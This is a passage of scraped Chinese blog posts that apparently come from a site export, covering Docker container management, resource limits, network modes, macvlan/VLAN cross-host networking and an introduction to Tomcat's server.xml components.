centos:nginx.org centos\r8f1a542c6058caeeb8b59e02b86e7b9cabc2bc7784d71e355f5d5ca7a6738481\r$ docker exec link cat /etc/hosts\r127.0.0.1\tlocalhost\r::1\tlocalhost ip6-localhost ip6-loopback\rfe00::0\tip6-localnet\rff00::0\tip6-mcastprefix\rff02::1\tip6-allnodes\rff02::2\tip6-allrouters\r172.17.0.2\t*nginx.org* 8f6e13a26afe centos\r172.17.0.3\t8f1a542c6058\rlog-driver docker 容器默认日志保存位置 /var/lib/docker/containers/container-json.log\n$ ls -1 /var/lib/docker/containers\r8f1a542c6058caeeb8b59e02b86e7b9cabc2bc7784d71e355f5d5ca7a6738481\r8f6e13a26afe60ee2ac5335d419852d70580343f590c2500964f54020e54391c\r$ ls -1\r8f6e13a26afe60ee2ac5335d419852d70580343f590c2500964f54020e54391c-json.log\rcheckpoints\rconfig.v2.json\rhostconfig.json\rhostname\rhosts\rmounts\rresolv.conf\rresolv.conf.hash|\r$ cat 8f6e..1c-json.log 可以在启动时将日志输出到指定位置。\n驱动 介绍 none 不输出日志 json-file Docker的默认日志记录驱动程序，格式为JSON。 syslog 将日志消息写入syslog journald 将日志消息写入journald。 journald守护程序必须在主机上运行。 gelf 将日志消息写入Graylog扩展日志格式（GELF）端点，例如Graylog或Logstash。 fluentd 将日志消息写入流利（正向输入）。流利的守护程序必须在主机上运行 awslogs 将日志消息写入Amazon CloudWatch Logs。 splunk 使用HTTP事件收集器将日志消息写入splunk etwlogs 将日志消息写为Windows事件跟踪（ETW）事件。仅适用于Windows平台。 gcplogs 将日志消息写入Google Cloud Platform（GCP）日志记录。 nats 用于Docker的nats NATS日志记录驱动程序。将日志条目发布到NATS服务器。 指定日志驱动测试 docker run -tid --name nginx --log-driver syslog nginx\rcurl 172.17.0.4\r# 新窗口查看日志可见到容器记录到宿主机的syslog中\r$ tail -f /var/log/messages Jul 26 01:44:18 docker-node2 systemd: Started Session 8 of user root.\rJul 26 01:44:18 docker-node2 systemd: Starting Session 8 of user root.\rJul 26 01:45:20 docker-node2 5f95cf77c994[2032]: 172.17.0.1 \\\r- - [25/Jul/2018:17:45:20 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 612 \u0026quot;-\u0026quot; \u0026quot;curl/7.29.0\u0026quot; \u0026quot;-\u0026quot;\r挂载宿主机的分区到容器\nUse bind mounts | Docker Documentation\n将容器的端口映射到宿主机上\ndocker run -itd -p 8080:80 centos\r将expose声明的所有端口映射到宿主机的随机端口\n-P 容器down掉自动重启\ndocker run -tid --name nginx --restart always nginx\r$ docker attach nginx\r^C\r$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\r07b2196fb6c5 nginx \u0026quot;nginx -g 'daemon of…\u0026quot; About a minute ago Up 4 seconds 80/tcp nginx\r设置文件描述符大小\ndocker run -itd --name test --ulimit nproc=1024 --ulimit nofile=1024 centos\r$ docker attach test\r$ ulimit -a\ropen files (-n) 1024\rmax user processes (-u) 1024\r资源限制 例1：限制cpu使用数量\ndocker run -tid --name cpu2 --cpus=2 centos\r使用stress测试cpu使用情况\n测试机器为双核4G硬件资源\n1. 限制两颗CPU\n$ stress -c 13\rstress: info: [70] dispatching hogs: 13 cpu, 0 io, 0 vm, 0 hdd\r# 使用 docker stats 查看\rdocker stats cpu2\rCONTAINER ID NAME CPU % MEM USAGE / LIMIT MEM % 1eed573b906a cpu2 199.46% 792KiB / 3.686GiB 0.02%\r在宿主机上top查看\n%Cpu0 : 99.7 us, 0.3 sy, 0.0 ni, 0.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu1 :100.0 us, 0.0 sy, 0.0 ni, 0.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r将cpu增加至4核，查看cpu状态 %Cpu0 : 0.0 us, 0.0 sy, 0.0 ni,100.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu1 : 99.7 us, 0.0 sy, 0.0 ni, 0.3 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu2 : 0.0 us, 0.3 sy, 0.0 ni, 99.7 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu3 : 99.7 us, 0.0 sy, 0.0 ni, 0.3 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r2. 限制1颗CPU\n限制容器只使用1核cpu。观察容器状态。发现容器将使用率均衡在其他核心上。\n%Cpu0 : 0.0 us, 0.0 sy, 0.0 ni,100.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu1 : 30.4 us, 0.0 sy, 0.0 ni, 69.6 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu2 : 19.7 us, 0.0 sy, 0.0 ni, 80.3 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu3 : 49.2 us, 0.0 sy, 0.0 ni, 50.8 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu0 : 0.0 us, 0.3 sy, 0.0 ni, 99.7 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu1 : 0.0 us, 0.3 sy, 0.0 ni, 99.7 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu2 : 49.5 us, 0.0 sy, 0.0 ni, 50.5 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu3 : 49.7 us, 0.3 sy, 0.0 ni, 50.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r结论：对于进程来说是没有 CPU 个数这一概念的，内核只能通过进程消耗的 CPU 时间片来统计出进程占用 CPU 的百分比。这也是我们看到的各种工具中都使用百分比来说明 CPU 使用率的原因。\n官方文档：Limit a container\u0026rsquo;s resources | Docker Documentation\n指定固定的 CPU\n$ docker run -tid --name cpunum --cpuset-cpus=\u0026quot;2\u0026quot; stress\r31d72f808e8992bcfbfead1d4d7a78e37235e1e42c8b2011b67a15d542829287\r$ docker attach cpunum\r$ stress -c 4\rtop查看cpu状态，发现只有固定的一个cpu被使用\n%Cpu0 : 0.0 us, 0.3 sy, 0.0 ni, 99.7 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu1 : 0.0 us, 0.0 sy, 0.0 ni,100.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu2 :100.0 us, 0.0 sy, 0.0 ni, 0.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu3 : 0.0 us, 0.3 sy, 0.0 ni, 99.7 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r限制多个cpunum。\n$ docker run -tid --name cpunum2 --cpuset-cpus=\u0026quot;0,3\u0026quot; stress\rb4cb513dad71aa9c6cc5578a70253c704dcde59a5b1306943a3967c414e2d9a9\r$ docker attach cpunum2\r$ stress -c 4\rtop查看cpu状态\n%Cpu0 :100.0 us, 0.0 sy, 0.0 ni, 0.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu1 : 0.0 us, 0.0 sy, 0.0 ni,100.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu2 : 0.0 us, 0.0 sy, 0.0 ni,100.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r%Cpu3 :100.0 us, 0.0 sy, 0.0 ni, 0.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st\r设置CPU权重\n当 CPU 资源充足时，设置 CPU 的权重是没有意义的。只有在容器争用 CPU 资源的情况下， CPU 的权重才能让不同的容器分到不同的 CPU 用量。\u0026ndash;cpu-shares 选项用来设置 CPU 权重，它的默认值为 1024。我们可以把它设置为 2 表示很低的权重，但是设置为 0 表示使用默认值 1024。\ndocker run -tid --name cpu-test1 --cpuset-cpus=\u0026quot;0\u0026quot; --cpu-shares=512 stress\rdocker run -tid --name cpu-test2 --cpuset-cpus=\u0026quot;0\u0026quot; --cpu-shares=0 stress\r当只有test-1使用cpu资源时的CPU负载\n1717c10e24ae cpu-test2 0.00% 376KiB / 3.686GiB 0.01% 8a1e1a944e2b cpu-test1 99.96% 680KiB / 3.686GiB 0.02% 当test-1与test-2争用资源时的CPU负载\n1717c10e24ae cpu-test2 66.91% 668KiB / 3.686GiB 8a1e1a944e2b cpu-test1 33.37% 576KiB / 3.686GiB 两个容器分享一个 CPU，所以总量应该是 100%。具体每个容器分得的负载则取决于 \u0026ndash;cpu-shares 选项的设置！我们的设置分别是 512 和 1024，则它们分得的比例为 1:2。在本例中如果想让两个容器各占 50%，只要把 \u0026ndash;cpu-shares 选项设为相同的值就可以了。\n对容器资源的限制 /sys/fs/cgroup/\ndocker run -tid --name cpunum2 --cpuset-cpus=\u0026quot;0,3\u0026quot; stress\r$ cat cpuset/cpuset.cpus\r0,3\r","permalink":"https://www.oomkill.com/2018/06/docker-ma/","summary":"","title":"docker容器管理"},{"content":"docker的四种网络模式 Bridge模式（默认） 当Docker进程启动时，会在宿主机上创建一个名为docker0的虚拟网桥，此主机上启动的Docker容器会连接到这个虚拟网桥上。虚拟网桥的工作方式和物理交换机类似，这样主机上的所有容器就通过交换机连在了一个二层网络中。\n默认ip段172.17.0.1/16；从docker0子网中分配一个IP给容器使用，并设置docker0的IP为容器的默认网关。在主机上创建一对虚拟网卡veth pair设备，Docker将veth pair设备的一端放在新创建的容器中，并命名为eth0（容器的网卡），另一端放在主机中，以vethxxx这样类似的名字命名，并将这个网络设备加入到docker0网桥中。可以通过brctl show命令查看。\n使用 docker run -p 时，docker实际是在iptables做了DNAT规则，实现端口转发功能。可以使用 iptables -t nat -nL 查看。\nhost模式 启动容器的时候使用host模式，那么这个容器将不会获得一个独立的Network Namespace，而是和宿主机共用一个Network Namespace。容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。但是，容器的其他方面，如文件系统、进程列表等还是和宿主机隔离的。\nnone模式 使用none模式，Docker容器拥有自己的Network Namespace，但是，并不为Docker容器进行任何网络配置。也就是说，这个Docker容器没有网卡、IP、路由等信息。需要我们自己为Docker容器添加网卡、配置IP等。\ncontainer模式 这个模式指定新创建的容器和已经存在的一个容器共享一个 Network Namespace，而不是和宿主机共享。新创建的容器不会创建自己的网卡，配置自己的 IP，而是和一个指定的容器共享 IP、端口范围等。同样，两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。两个容器的进程可以通过 lo 网卡设备通信。\n容器外部访问原理 docker0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet 172.17.0.1 netmask 255.255.0.0 broadcast 0.0.0.0\rinet6 fe80::42:a5ff:fe59:2034 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 02:42:a5:59:20:34 txqueuelen 0 (Ethernet)\rRX packets 56986 bytes 2746876 (2.6 MiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 64106 bytes 503304169 (479.9 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rdocker run -itd --name test_network -p 80:80 centos:6\r$ iptables -t nat -nL\rChain POSTROUTING (policy ACCEPT)\rtarget prot opt source destination MASQUERADE all -- 172.17.0.0/16 0.0.0.0/0 MASQUERADE tcp -- 172.17.0.2 172.17.0.2 tcp dpt:80\rChain DOCKER (2 references)\rtarget prot opt source destination RETURN all -- 0.0.0.0/0 0.0.0.0/0 DNAT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:80 to:172.17.0.2:80\r配置桥接网络 下载网桥管理工具 yum install bridge-utils -y\r停止docker并删除docker0网桥 ip link set dev docker0 down\rbrctl delbr docker0\r创建新桥接物理网络虚拟网桥test brctl addbr test\rip link set dev test up\rip addr add 10.10.10.0/24 dev test #为br0分配物理网络中的ip地址\rip addr del 10.0.0.0/24 dev eth0 #将宿主机网卡的IP清空\rbrctl addif test eth0\r$ docker run -itd --name centos centos:6\r26ea6dde6564006f148e4977d131e671b578c2c5df313b1d872940a9e48f0309\r$ docker attach centos\r$ ifconfig\reth0 Link encap:Ethernet HWaddr 02:42:C0:A8:00:02 inet addr:192.168.0.2 Bcast:0.0.0.0 Mask:255.255.255.0\rinet6 addr: fe80::42:c0ff:fea8:2/64 Scope:Link\rUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\rRX packets:7 errors:0 dropped:0 overruns:0 frame:0\rTX packets:7 errors:0 dropped:0 overruns:0 carrier:0\rcollisions:0 txqueuelen:0 RX bytes:578 (578.0 b) TX bytes:578 (578.0 b)\r将docker0加入网桥中\n$ brctl show\rbridge name\tbridge id\tSTP enabled\tinterfaces\rdocker0\t8000.024206e55aa2\tno\t$ docker run -itd --net host centos\r5237ae95c660a0354046f0e5ff839c9a4babda7c9743ca8f4d2338e6a8445e55\r\u0026quot;Networks\u0026quot;: {\r\u0026quot;host\u0026quot;: {\r\u0026quot;IPAMConfig\u0026quot;: null,\r\u0026quot;Links\u0026quot;: null,\r\u0026quot;Aliases\u0026quot;: null,\r\u0026quot;NetworkID\u0026quot;: \u0026quot;b2768c9e7cb0de16cde0626abbca8414ca80c96101531aa7842dfed7ee9fc884\u0026quot;,\r\u0026quot;EndpointID\u0026quot;: \u0026quot;645627ef6384f1f36e3cfeddd5d9346cfdf1e8997b597c2ec1edd8577e17d6f5\u0026quot;,\r\u0026quot;Gateway\u0026quot;: \u0026quot;\u0026quot;,\r\u0026quot;IPAddress\u0026quot;: \u0026quot;\u0026quot;,\r\u0026quot;IPPrefixLen\u0026quot;: 0,\r\u0026quot;IPv6Gateway\u0026quot;: \u0026quot;\u0026quot;,\r\u0026quot;GlobalIPv6Address\u0026quot;: \u0026quot;\u0026quot;,\r\u0026quot;GlobalIPv6PrefixLen\u0026quot;: 0,\r\u0026quot;MacAddress\u0026quot;: \u0026quot;\u0026quot;,\r\u0026quot;DriverOpts\u0026quot;: null\r}\r}\r}\r}\r]\r查看网络模式\n$ docker network ls\rNETWORK ID NAME DRIVER SCOPE\ra39cc87800d6 bridge bridge local\rb2768c9e7cb0 host host local\r329e3d9d1c3f none null local\rtags: []\nisStarred: false\nisTrashed: false\n修改docker0默认ip\n$ cat /etc/docker/daemon.json {\r\u0026quot;bip\u0026quot;: \u0026quot;192.168.100.1/24\u0026quot;\r}\rReference Docker Centos7 下建立 Docker 桥接网络 - weifengCorp - 博客园 centos7 docker宿主机配置桥接物理网络终极实战-zhaoyfcomeon-成长之路-51CTO博客 docker自定义网桥 - CSDN博客 ","permalink":"https://www.oomkill.com/2018/06/docker-network/","summary":"","title":"Docker网络"},{"content":"关于vlan说明 Macvlan和ipvlan是Linux网络驱动程序，它们将底层或主机接口直接暴露给在主机中运行的VM或容器。\nMacvlan允许单个物理接口使用macvlan子接口具有多个mac和ip地址。这与使用vlan在物理接口上创建子接口不同。使用vlan子接口，每个子接口使用vlan属于不同的L2域，所有子接口都具有相同的mac地址。使用macvlan，每个子接口将获得唯一的mac和ip地址，并将直接暴露在底层网络中。Macvlan接口通常用于虚拟化应用程序，每个macvlan接口都连接到Container或VM。每个容器或VM可以直接从公共服务器获取dhcp地址，就像主机一样。这将有助于希望Container成为传统网络的客户使用他们已有的IP寻址方案。Macvlan有4种类型(Private, VEPA, Bridge, Passthru)。常用的类型是Macvlan网桥，它允许单个主机中的端点能够在没有数据包离开主机的情况下相互通信。对于外部连接，使用底层网络。下图显示了两个使用macvlan网桥相互通信以及外部世界的容器。两个容器将使用Macvlan子接口直接暴露在底层网络中。\n使用mavvlan构建docker网络 Macvlan，MACVLAN或MAC-VLAN允许您在单个物理接口上配置多个第2层（即以太网MAC）地址。 Macvlan允许您配置父物理以太网接口（也称为上层设备）的子接口（也称为从设备），每个接口都有自己唯一的（随机生成的）MAC地址，因此也有自己的IP地址。然后，应用程序、VM和容器可以绑定到特定的子接口，以使用自己的MAC和IP地址直接连接到物理网络。\nMavlan子接口不能直接与父接口通信，即VM不能直接与主机通信。如果需要VM主机通信，则应添加另一个macvlan子接口并将其分配给主机。\nMacvlan子接口使用 eth0.20@eth0 表示法来清楚地识别子接口及其父接口。子接口状态绑定到其父级状态。如果eth0关闭，则 eth0.20@eth0 也会关闭。\n配置macvlan先决条件 至少需要Linux内核版本3.9以上，建议使用4.0或更高版本。 环境准备 主机名 IP地址 地位 软件环境 物理机 10.0.0.1 物理机 windows10 网关 10.0.0.2 宿主机网关 vmvare网关 c1 10.0.0.3 容器01 docker c2 10.0.0.4 容器02 docker node01 10.0.0.15 宿主机01（vm虚拟机） centos 7.3/docker-ce1806 node02 10.0.0.16 宿主机02（vm虚拟机） centos 7.3/docker-ce1806 2.3 启动网卡混合模式 两台主机网卡使用桥接模式,网卡混杂模式开启全部允许。\n主机上配置的eth0网卡和创建的vlan网卡,均需要开启混杂模式。如果不开启混杂模式会导致macvlan网络无法访问外界,具体在不使用vlan时,表现为无法ping通路由,无法ping通同一网络内其他主机。\nip link set eth0 promisc on\rip link set eth0 promisc off\r开启后查看网卡状态\n$ ip addr\r2: eth0: \u0026lt;BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000\rlink/ether 00:0c:29:84:f3:29 brd ff:ff:ff:ff:ff:ff\rinet 10.0.0.15/24 brd 10.0.0.255 scope global eth0\rvalid_lft forever preferred_lft forever\rinet6 fe80::20c:29ff:fe84:f329/64 scope link valid_lft forever preferred_lft forever\r其中BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP的PROMISC说明网卡eth0已开启成混杂模式。\n注：以上设置临时生效\n基于macvlan构建docker跨宿主机通讯 docker network create \\\r-d macvlan \\\r--subnet=10.10.0.0/24 \\\r--gateway=10.10.0.254 \\\r-o parent=eth0 mvl1\r说明：容器默认使用主机的DNS设置，因此无需配置DNS服务器。\n查看创建结果\n$ docker network ls NETWORK ID NAME DRIVER SCOPE\r3d2449dfe4b1 bridge bridge local\r7110f9183457 host host local\r9852fc2a7109 mvl1 macvlan local\r在node01上运行容器\ndocker run -tid --name c1 --net mvl1 --ip 10.10.0.1 busybox\r在node02上运行容器\ndocker run -tid --name c2 --net mvl1 --ip 10.10.0.2 busybox\r在C1上平C2 检查结果\n/ # ifconfig\reth0 Link encap:Ethernet HWaddr 02:42:0A:0A:00:01 inet addr:10.10.0.1 Bcast:10.10.0.255 Mask:255.255.255.0\rUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\rRX packets:0 errors:0 dropped:0 overruns:0 frame:0\rTX packets:0 errors:0 dropped:0 overruns:0 carrier:0\rcollisions:0 txqueuelen:0 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B)\rlo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0\rUP LOOPBACK RUNNING MTU:65536 Metric:1\rRX packets:0 errors:0 dropped:0 overruns:0 frame:0\rTX packets:0 errors:0 dropped:0 overruns:0 carrier:0\rcollisions:0 txqueuelen:1 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B)\r/ # ping 10.10.0.2\rPING 10.10.0.2 (10.10.0.2): 56 data bytes\r64 bytes from 10.10.0.2: seq=0 ttl=64 time=0.397 ms\r64 bytes from 10.10.0.2: seq=1 ttl=64 time=0.278 ms\r构建macvlan与宿主机同网段docker网络 在两台主机上分别创建docker网络\ndocker network create -d macvlan --subnet=10.0.0.0/24 --gateway=10.0.0.2 -o parent=eth0 mvl1\r说明：\n--gateway为宿主机的网关，如宿主机为物理机则设置路由器的ip。 --subnet为宿主机所在网段。 在两台主机上分别创建容器\ndocker run -ti --net mvl1 --ip 10.0.0.4 busybox\rdocker run -ti --net mvl1 --ip 10.0.0.3 busybox\r测试网络连通情况\nping网关，结论：通。\n/ # ping 10.0.0.2\rPING 10.0.0.2 (10.0.0.2): 56 data bytes\r64 bytes from 10.0.0.2: seq=0 ttl=128 time=0.330 ms\rping宿主机，结论：不通。\n/ # ping 10.0.0.15\rPING 10.0.0.15 (10.0.0.15): 56 data bytes\rping其他宿主机，结论：通。\n/ # ping 10.0.0.16\rPING 10.0.0.16 (10.0.0.16): 56 data bytes\r64 bytes from 10.0.0.16: seq=0 ttl=64 time=0.530 ms\rping其他容器，结论：通。\n/ # ping 10.0.0.3\rPING 10.0.0.3 (10.0.0.3): 56 data bytes\r64 bytes from 10.0.0.3: seq=0 ttl=64 time=0.435 ms\r带有VLAN的macvlan 说明 单个Docker主机网络接口只能作为一个macvlan或ipvlan网络的父接口。然而，一个macvlan，一个第2层域和每个物理接口一个子网是现代虚拟化解决方案中相当严重的限制。幸运的是，Docker主机子接口可以作为macvlan网络的父接口。这与VLAN的Linux实现完全一致，其中802.1Q中继连接上的每个VLAN都在物理接口的子接口上。\nvlan介绍 VLAN(Virtual Local Area Network)又称虚拟局域网，是指在局域网的基础上，采用网络管理软件构建的可跨越不同网段、不同网络的端到端的逻辑网络。\n一个VLAN组成一个逻辑子网，即一个逻辑广播域，它可以覆盖多个网络设备，允许处于不同地理位置的网络用户加入到一个逻辑子网中。使用VLAN功能后，能够将网络分割成多个广播域。\nLinux支持在物理网卡上创建vlan子接口。每个vlan子接口属于不同的二层域，所有的vlan子接口拥有相同的MAC地址。这点是和Macvlan子接口不同的地方。\nvlan范围说明\n范围 说明 0，4095 保留 仅限系统使用 用户不能查看和使用这些VLAN 1 正常 Cisco默认VLAN 用户能够使用该VLAN，但不能删除它 2-1001 正常 用于以太网的VLAN 用户可以创建、使用和删除这些VLAN 1002-1005 正常 用于FDDI和令牌环的Cisco默认VLAN 用户不能删除这些VLAN 1006-1024 保留 仅限系统使用 用户不能查看和使用这些VLAN 1025-4094 扩展 仅用于以太网VLAN 环境准备 主机名 IP地址 地位 软件环境 c1 10.10.0.1 容器01-02 docker c2 10.10.0.2 容器01-02 docker c3 10.10.0.3 容器02-01 docker c4 10.10.0.4 容器02-02 docker gateway01 10.0.0.253 容器01网关 gateway01 10.0.0.254 容器01网关 node01 10.0.0.15 宿主机01（vm虚拟机） centos 7.3/docker-ce1806 node02 10.0.0.16 宿主机02（vm虚拟机） centos 7.3/docker-ce1806 创建VLAN 为node01物理网卡创建macvlan子接口\nip link add link eth0 name eth0.100 type vlan id 100\rip link add link eth0 name eth0.200 type vlan id 200\r启用macvlan\nip link set eth0.100 up\rip link set eth0.200 up\r设置macvlan的ip和网关\nip addr add 10.10.0.254/24 dev eth0.100\rip addr add 10.20.0.254/24 dev eth0.200\rip route add default via 10.10.0.254 dev eth0.100\rip route add default via 10.20.0.254 dev eth0.200\r参考网址 Exploring Docker Networking – Host, None, and MACVLAN | raid-zero.com | Page 3\nDocker Networking: macvlans with VLANs – HiCube\n","permalink":"https://www.oomkill.com/2018/06/docker-cross-node-network-macvlan/","summary":"","title":"macvlan实现docker跨宿主机访问"},{"content":"tomcat介绍 Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，它早期的名称为catalina，后来由Apache、Sun 和其他一些公司及个人共同开发而成，并更名为Tomcat。\njava体系结构 java程序设计语言（编程） java类文件格式 java api java vm java 纯面向对象语言\nobj：以指令为中心，围绕指令组织数据\n面向对象：以数据为中心，围绕数据组织指令\nTomcat核心组件：\nCatalina：servlet container在tomcat中用于实现servlet代码的被称作Catalina Coyote：一个http连接器，能够接受http请求并相应http请求的web服务器 jasper：JSP Engine jsp翻译器 Tomcat组成部分 Tomcat支持Servlet和JSP1的规范，它由一组嵌套的层次和组件组成，一般可分为以下四类：\n顶级组件：位于配置层次的顶级，并且彼此间有着严格的对应关系； 连接器：连接客户端（可以是浏览器或Web服务器）请求至Servlet容器， 容器：包含一组其它组件； 被嵌套的组件：位于一个容器当中，但不能包含其它组件； tomcat常见组件 服务器(server) 服务器(server)顶级组件：Tomcat的一个实例，通常一个JVM只能包含一个Tomcat实例；因此，一台物理服务器上可以在启动多个JVM的情况下在每一个JVM中启动一个Tomcat实例，每个实例分属于一个独立的管理端口。这是一个顶级组件。\nserver相关属性 className：用于实现此Server容器的完全限定类的名称，默认为 org.apache.cataliana.core.StandardServer;\nport：接收shutdown指令的端口，默认仅允许通过本机访问，默认为8005\nshutdown：发往此Server用于实现关闭tomcat实例的命令字符串，默认为SHUTDOWN\n服务(service) Service主要用于关联一个引擎和此引擎相关的连接器，每个连接器通过一个特定的端口和协议接收入站请求将其转发至关联的引擎进行处理，因此，Service要包含一个引擎（Engine）、一个或多个连接器（Connector）。 定义一个名为Catalina的Service，此名字也会产生相关的日志信息时记录在日志文件当中。\n\u0026lt;Service name=\u0026quot;Catalina\u0026quot;\u0026gt;\rService相关属性 className：用于实现service的类名，一般都是 org.apache.catalina.core.StandardService\nname：此服务的名称，默认为Catalina。\n连接器(connectors) 分析并接收用户请求，并把它转换成本地jsp文件代码的请求。负责连接客户端（可以是浏览器或Web服务器）请求至Servlet容器内的Web应用程序，通常指的是接收客户发来请求的位置及服务器端分配的端口。 默认端口通常是HTTP协议的8080，管理员也可以根据自己的需要改变此端口。一个引擎可以配置多个连接器，但这些连接器必须使用不同的端口。默认的连接器是基于HTTP/1.1的Coyote。同时，Tomcat也支持AJP、JServ和JK2连接器。\n进入Tomcat的请求可以根据Tomcat的工作模式分为如下两类：\nTomcat作为应用程序服务器：请求来自于前端的web服务器，这可能是Apache IIS Nginx。\nTomcat作为独立服务器：请求来自与web浏览器。\nTomcat应该考虑工作情形并为相应情形下的请求分别定义好需要的连接器才能正确接收来自于客户端的请求，一个引擎可以有一个或多个连接器，以适应多种请求方式。\n定义连接器可以使用多种属性，有些属性也只是适用于某种特定的连接器类型，\n一般来说，常见于server.xml中的连接器类型通常有4种：\nHTTP连接器 SSL连接器 AJP 1.3连接器 proxy连接器 \u0026lt;Connector port=\u0026quot;8080\u0026quot; protocol=\u0026quot;HTTP/1.1\u0026quot;\rmaxThreads=\u0026quot;150\u0026quot; connectionTimeout=\u0026quot;20000\u0026quot;\rredirecPort=\u0026quot;8443\u0026quot; /\u0026gt;\rConnector常见属性 定义连接器时可以配置的属性非常多，单通常定义HTTP连接器时必须定义的属性只有port，定义AJP连接器时必须定义的属性只有protocol，默认的协议为HTTP。\n属性 解释 address 指定连接器监听的地址，默认为所有地址，即0.0.0.0。 maxThread 支持的最大（线程）并发连接数，默认为200。 port 监听的端口，默认为0。 protocol 连接器使用的协议，默认为HTTP/1.1，定义AJP协议时通常为AJP/1.3。 redirectPort 如果某种连接器支持的协议是HTTP，当接收客户端发来的HTTPS请求时，则转发至此属性定义的端口。 connectionTimeout 等待客户端发送请求的超时时间.单位为毫秒，默认为60000，即1分钟。 enableLookups 是否通过request.getRemoteHost()进行DNS直询以获取客户端的主机名；默认为true。 acceptCount 设置等待队列的最大长度：通常在tomcat所有处理线程均处于繁忙时，新发来的请求将被放置于等待队列中。 minSpareThreads 最小空闲进程 下面是定义了多个属性的SSL简介器：\n\u0026lt;Connector port=\u0026quot;8443\u0026quot; maxThread=\u0026quot;150\u0026quot; minSpareThreads=\u0026quot;25\u0026quot; maxSpareThreads=\u0026quot;75\u0026quot;\renableLookups=\u0026quot;false\u0026quot; acceptCount=\u0026quot;100\u0026quot; debug=\u0026quot;0\u0026quot; scheme=\u0026quot;https\u0026quot;\rsecure=\u0026quot;true\u0026quot; clientAuth=\u0026quot;false\u0026quot; sslProtocol=\u0026quot;TLS\u0026quot; /\u0026gt;\r引擎(Engine) 引擎是指处理请求的Servlet引擎组件，即Catalina Servlet引擎，它从HTTPconnector接收请求并响应请求。它检查每一个请求的HTTP首部信息以辨别此请求应该发往哪个host或context，并将请求处理后的结果返回的相应的客户端。严格意义上来说，容器不必非得通过引擎来实现，它也可以是只是一个容器。如果Tomcat被配置成为独立服务器，默认引擎就是已经定义好的引擎。而如果Tomcat被配置为Apache Web服务器的提供Servlet功能的后端，默认引擎将被忽略，因为Web服务器自身就能确定将用户请求发往何处。一个引擎可以包含多个host组件。\nEngine组件: Engine是Servlet处理器的一个实例，即servlet引擎，默认为为定义在server.xml中的Catalina。 Engine需要的defaultHost属性来为其定义一个接收所有发往非明确定义虚拟主机的请求host组件。如前面示例中定义的：\n\u0026lt;Engine name='Catalina' defaultHost='localhost'\u0026gt;\rEngine容器中可以包含Realm、Host、Listener和Valve子容器\nengine常用属性 属性 说明 defaultHost Tomcat支持基于FQDN的虚拟主机，这些虚拟主机可以在Engine容器中定义多个不同的Host组件来实现；单如果此引擎的连接器收到一个发往非明确定义虚拟主机的请求时则需要将此请求发往一个默认的虚拟主机进行处理，因此，在Engine中定义的多个虚拟主机的主机名称至少要有一个根defaultHost定义的书记名称同名。 name Engine组件的名称，用于日志和错误信息记录时区别不同的引擎。 jvmroute tomcat由众多组件组成，这些组件分别用于实现不同的功能。\n\u0026lt;server\u0026gt;\r\u0026lt;service\u0026gt;\r\u0026lt;connector /\u0026gt;\r\u0026lt;connector /\u0026gt;\r...\r\u0026lt;engine\u0026gt;\r\u0026lt;host\u0026gt;\r\u0026lt;context /\u0026gt;\r..\r\u0026lt;/host\u0026gt;\r..\r\u0026lt;/engine\u0026gt;\r\u0026lt;/service\u0026gt;\r\u0026lt;/server\u0026gt;\r主机(Host) 主机组件类似于Apache中的 虚拟主机，但在Tomcat中只支持基于FQDN的“虚拟主机”。一个引擎至少要包含一个主机组件。 位于Engine容器中，用于接收请求并进行相应处理的主机或虚拟主机\n\u0026lt;Host name='localhsot' appBase='webapps'\runpackWARs='true' autoDeploy='true'\rxmlValidation='false' xmlNamespaceAware='false'\u0026gt;\r\u0026lt;/Host\u0026gt;\r常用属性 属性 说明 appBase 此host的webapps目录，即存放非归档的web应用程序的目录或归档后的WAR文件的目录路径。可以位用基于$CATALINA_HOME的相对路径。 autoDeploy 在Tomcat处于运行状态时放置于appBase目录中的应用程序文件是否自动进行deploy，默认认为true。 